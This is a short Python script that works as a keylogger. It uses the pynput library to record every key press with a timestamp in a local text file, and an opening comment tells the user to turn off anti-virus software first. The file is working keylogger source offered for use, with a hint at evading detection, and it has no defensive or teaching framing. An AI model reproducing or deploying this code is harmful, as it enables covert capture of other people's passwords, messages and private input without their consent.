#Remeber to turn off the anti-virus 
import pynput
from pynput.keyboard import Key, Listener
import logging

# change  ↓↓↓  to your folder path  
log_dir = r"D/+PROJECTS/KeyLogger"   # file name ↓↓
logging.basicConfig(filename = (log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
